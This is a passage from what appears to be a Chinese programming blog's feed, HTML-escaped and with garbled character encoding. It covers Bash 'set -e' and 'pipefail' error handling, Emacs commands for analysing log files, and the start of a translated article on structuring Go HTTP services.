&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">bash: line 2: cd: /non/exist/path: No such file or directory
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/non/exist/path is not found
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™ç§æ‰‹å·¥å¤„ç†çš„æ–¹å¼æ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”å®¹æ˜“é—æ¼ã€‚ &lt;code>set -e&lt;/code> å‘½ä»¤å¯ä»¥æ¯”è¾ƒå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯¥å‘½ä»¤è®¾ç½®åï¼Œä¸€æ—¦æŸä¸ªå‘½ä»¤å¤±è´¥ï¼Œä¼šç«‹å³åœæ­¢åç»­å‘½ä»¤çš„æ‰§è¡Œã€‚&lt;/p>
&lt;p>&lt;a id="code-snippet--set-e3">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -e
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /non/exist/path
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;do something dangerous like rm files&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">bash: line 4: cd: /non/exist/path: No such file or directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="set-o-pipefail-å¤„ç†ç®¡é“é”™è¯¯">&lt;code>set -o pipefail&lt;/code> å¤„ç†ç®¡é“é”™è¯¯&lt;/h2>
&lt;p>&lt;code>set -e&lt;/code> ä¸é€‚ç”¨äºç®¡é“å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š&lt;/p>
&lt;p>&lt;a id="code-snippet--pipefail1">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -e
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /non/exist/path &lt;span class="p">|&lt;/span> &lt;span class="nb">echo&lt;/span> hello
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> world
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">hello
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat: /non/exist/path: No such file or directory
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">world
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>set -o pipefail&lt;/code> å¯ä»¥è§£å†³è¯¥é—®é¢˜ï¼š&lt;/p>
&lt;p>&lt;a id="code-snippet--pipefail2">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -eo pipefail
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /non/exist/path &lt;span class="p">|&lt;/span> &lt;span class="nb">echo&lt;/span> hello
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> world
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Output:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">hello
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat: /non/exist/path: No such file or directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æ€»ç»“">æ€»ç»“&lt;/h2>
&lt;p>ä¸Šè¿°å››ä¸ª &lt;code>set&lt;/code> å‘½ä»¤å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ–¹å¼ä¸€èµ·è®¾ç½®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å†™æ³•ä¸€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -euxo pipefail
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å†™æ³•äºŒ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -eux
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> -o pipefail
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å»ºè®®æ”¾åœ¨æ‰€æœ‰ &lt;em>Bash&lt;/em> è„šæœ¬å¼€å¤´ã€‚&lt;/p>
&lt;p>å¦å¤–ä¹Ÿå¯ä»¥åœ¨æ‰§è¡Œ &lt;em>Bash&lt;/em> è„šæœ¬æ—¶ï¼Œä»å‘½ä»¤è¡Œä¼ å…¥è¿™äº›å‚æ•°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bash -euxo pipefail /path/to/script.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html">The Set Builtin (Bash Reference Manual)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash è„šæœ¬ set å‘½ä»¤æ•™ç¨‹ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/bash/" term="Bash" label="Bash"/></entry><entry><title type="text">ç”¨ Emacs åˆ†ææ—¥å¿—æ–‡ä»¶</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/use-emacs-to-analyse-log-files/"/><id>https://mincodes.com/posts/use-emacs-to-analyse-log-files/</id><updated>2023-03-15T03:32:00+00:00</updated><published>2023-03-14T11:47:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">æ—¥å¸¸å¼€å‘å·¥ä½œä¸­ï¼Œç»å¸¸ä¼šéœ€è¦åˆ†ææ—¥å¿—æ–‡ä»¶ï¼Œæœ‰ä¸€ä»¶è¶æ‰‹çš„å·¥å…·ä¼šé«˜æ•ˆå¾ˆå¤šã€‚ Emacs æ­£æ˜¯è¿™æ ·ä¸€ä¸ªå·¥å…·ã€‚ Vim ä¹Ÿæœ‰ç±»ä¼¼çš„â€¦</summary><content type="html">&lt;p>æ—¥å¸¸å¼€å‘å·¥ä½œä¸­ï¼Œç»å¸¸ä¼šéœ€è¦åˆ†ææ—¥å¿—æ–‡ä»¶ï¼Œæœ‰ä¸€ä»¶è¶æ‰‹çš„å·¥å…·ä¼šé«˜æ•ˆå¾ˆå¤šã€‚&lt;/p>
&lt;p>Emacs æ­£æ˜¯è¿™æ ·ä¸€ä¸ªå·¥å…·ã€‚&lt;/p>
&lt;blockquote>
&lt;p>Vim ä¹Ÿæœ‰ç±»ä¼¼çš„åŠŸèƒ½ï¼ˆå‚è€ƒ &lt;a href="https://mincodes.com/posts/vim-tips/">Vim Tips&lt;/a>ï¼‰ï¼Œä½†å°±åˆ†ææ—¥å¿—æ¥è¯´ï¼Œä¼¼ä¹æ²¡æœ‰ Emacs æ¥å¾—æ–¹ä¾¿ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="ç»Ÿè®¡--æœç´¢">ç»Ÿè®¡ &amp;amp; æœç´¢&lt;/h2>
&lt;p>&lt;code>M-x count-matches&lt;/code> å¯è¾“å…¥æ­£åˆ™è¡¨è¾¾å¼ï¼Œç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•°&lt;/p>
&lt;p>&lt;code>C-M-s&lt;/code> æ­£åˆ™æœç´¢&lt;/p>
&lt;blockquote>
&lt;p>åœ¨è¾“å…¥æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå¦‚æœéœ€è¦åŒ¹é…æ¢è¡Œç¬¦ï¼Œè¯·è¾“å…¥ &lt;code>C-j&lt;/code> ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="æ›¿æ¢">æ›¿æ¢&lt;/h2>
&lt;p>&lt;code>C-M-%&lt;/code> &lt;code>query-replace-regexp&lt;/code> æ­£åˆ™æ›¿æ¢&lt;/p>
&lt;h2 id="è¿‡æ»¤">è¿‡æ»¤&lt;/h2>
&lt;p>&lt;code>M-s o pattern RET&lt;/code> åˆ—å‡ºæ‰€æœ‰åŒ¹é…è¡Œ&lt;/p>
&lt;p>&lt;code>keep-lines&lt;/code> ä»…ä¿ç•™åŒ¹é…çš„è¡Œ&lt;/p>
&lt;p>&lt;code>flush-lines&lt;/code> å‰”é™¤åŒ¹é…çš„è¡Œ&lt;/p>
&lt;h2 id="æå–">æå–&lt;/h2>
&lt;p>&lt;code>C-u M-s o pattern RET&lt;/code> å°†æ‰€æœ‰åŒ¹é…çš„æ–‡æœ¬ï¼Œå¯¼å‡ºåˆ° *&lt;em>Occur&lt;/em> buffer *ä¸­ã€‚è¿™ä¸ªåŠŸèƒ½æŒºæ–¹ä¾¿çš„ï¼Œå¯ä»¥å¿«é€Ÿå°†åŒ¹é…é¡¹æå–åˆ°å¦ä¸€ä¸ª buffer ä¸­ã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/emacs/" term="Emacs" label="Emacs"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/regexp/" term="Regexp" label="Regexp"/></entry><entry><title type="text">ç»å†å…«å¹´åï¼Œæˆ‘æ˜¯å¦‚ä½•ç”¨ Go å†™ HTTP æœåŠ¡çš„</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/how-i-write-http-services-in-go/"/><id>https://mincodes.com/posts/how-i-write-http-services-in-go/</id><updated>2023-02-22T08:49:00+00:00</updated><published>2023-02-22T03:15:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ä»Šå¤©è¯»åˆ°ä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼Œè®²å¦‚ä½•ç”¨ Go å†™ HTTP æœåŠ¡çš„ï¼Œå¾ˆæœ‰åŒæ„Ÿï¼Œç¿»è¯‘å¦‚ä¸‹ã€‚ åŸæ–‡é“¾æ¥ A Server struct ä¸€ä¸ª Server struct æ˜¯ä¸€ä¸ªä»£è¡¨æœâ€¦</summary><content type="html">&lt;p>ä»Šå¤©è¯»åˆ°ä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼Œè®²å¦‚ä½•ç”¨ Go å†™ HTTP æœåŠ¡çš„ï¼Œå¾ˆæœ‰åŒæ„Ÿï¼Œç¿»è¯‘å¦‚ä¸‹ã€‚&lt;/p>
&lt;p>&lt;a href="https://pace.dev/blog/2018/05/09/how-I-write-http-services-after-eight-years.html">åŸæ–‡é“¾æ¥&lt;/a>&lt;/p>
&lt;h2 id="a-server-struct">A Server struct&lt;/h2>
&lt;p>ä¸€ä¸ª Server struct æ˜¯ä¸€ä¸ªä»£è¡¨æœåŠ¡çš„å¯¹è±¡ï¼ŒæŒæœ‰æ‰€æœ‰ä¾èµ–ã€‚&lt;/p>
&lt;p>æ¯ä¸ªç»„ä»¶éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ server structï¼Œæœ€åçœ‹èµ·æ¥é€šå¸¸ç±»ä¼¼è¿™ä¸ªæ ·å­ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">db&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">someDatabase&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">router&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">someRouter&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">email&lt;/span> &lt;span class="nx">EmailSender&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>è¯¥ç»“æ„çš„å­—æ®µä¸»è¦æ˜¯å„ç§éœ€è¦å…±äº«çš„ä¾èµ–&lt;/li>
&lt;/ul>
&lt;h2 id="routesgo">routes.go&lt;/h2>
&lt;p>æ¯ä¸ªç»„ä»¶éƒ½æœ‰ä¸€ä¸ª &lt;code>routers.go&lt;/code> æ–‡ä»¶ï¼ŒåŒ…å«æ‰€æœ‰çš„è·¯ç”±ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nx">app&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">routes&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/api/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">handleAPI&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/about&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">handleAbout&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">HandleFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">handleIndex&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç”±äºå¤§éƒ¨åˆ†ä»£ç ç»´æŠ¤å·¥ä½œéƒ½æ˜¯ä»ä¸€ä¸ª URL å’Œä¸€ä¸ªé”™è¯¯æŠ¥å‘Šå¼€å§‹çš„ï¼Œæ‰€ä»¥åªéœ€è¦çœ‹ä¸€çœ¼ &lt;code>routes.go&lt;/code> æ–‡ä»¶ï¼Œå³å¯çŸ¥é“åº”è¯¥å»é‚£é‡ŒæŸ¥æ‰¾é—®é¢˜ã€‚&lt;/p>
&lt;h2 id="handlers-æŒ‚ç€hang-off-server-å¯¹è±¡">Handlers æŒ‚ç€ï¼ˆhang offï¼‰ server å¯¹è±¡&lt;/h2>
&lt;p>HTTP handlers æŒ‚ç€ server å¯¹è±¡ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handleSomething&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Handlers å¯ä»¥é€šè¿‡ server å¯¹è±¡è®¿é—®ä¾èµ–ã€‚&lt;/p>
&lt;h2 id="è¿”å›-handler">è¿”å› handler&lt;/h2>
&lt;p>Handler å‡½æ•°ä¸ç›´æ¥å¤„ç†è¯·æ±‚ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªå‡½æ•°å¤„ç†ä¹‹ã€‚&lt;/p>
&lt;p>è¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸€ä¸ªé—­åŒ…ç¯å¢ƒï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬çš„ handler å¯ä»¥è¿™æ ·æ“ä½œï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handleSomething&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">thing&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">prepareThing&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// use the thing
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>prepareThing()&lt;/code> æ–¹æ³•åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå› æ­¤ä½ å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€æ¬¡æ€§çš„ handler åˆå§‹åŒ–åŠ¨ä½œï¼Œç„¶ååœ¨ handler ä¸­ä½¿ç”¨åˆå§‹åŒ–çš„ç»“æœï¼ˆ &lt;code>thing&lt;/code> ï¼‰ã€‚&lt;/p>
&lt;p>åœ¨è®¿é—®å…±äº«æ•°æ®æ—¶ï¼Œç¡®ä¿åªæ‰§è¡Œè¯»æ“ä½œï¼Œå¦åˆ™éœ€è¦åŠ é”æˆ–è€…ç±»ä¼¼çš„ä¿æŠ¤æªæ–½ã€‚&lt;/p>
&lt;h2 id="é€šè¿‡å‚æ•°ä¼ é€’-handler-çš„ç‰¹å®šä¾èµ–">é€šè¿‡å‚æ•°ä¼ é€’ handler çš„ç‰¹å®šä¾èµ–&lt;/h2>
&lt;p>å¦‚æœä¸€ä¸ª handler éœ€è¦ä¸€ä¸ªç‰¹æ®Šä¾èµ–ï¼Œå¯ä»¥é€šè¿‡å‚æ•°æ¥ä¼ é€’ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handleGreeting&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">format&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;World&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
